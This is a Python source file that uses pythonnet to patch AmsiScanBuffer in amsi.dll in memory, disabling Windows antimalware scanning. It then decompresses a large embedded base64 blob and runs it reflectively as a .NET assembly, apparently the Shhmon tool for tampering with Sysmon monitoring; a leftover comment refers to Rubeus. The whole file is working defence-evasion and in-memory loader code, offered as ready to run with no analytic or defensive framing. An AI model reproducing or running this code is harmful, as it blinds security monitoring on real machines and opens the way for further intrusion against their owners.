import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("Shhmon.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    if method == None:
        method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        print(method)
    # Convert your command to a .NET string array
    command_args = Array[str](command)

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()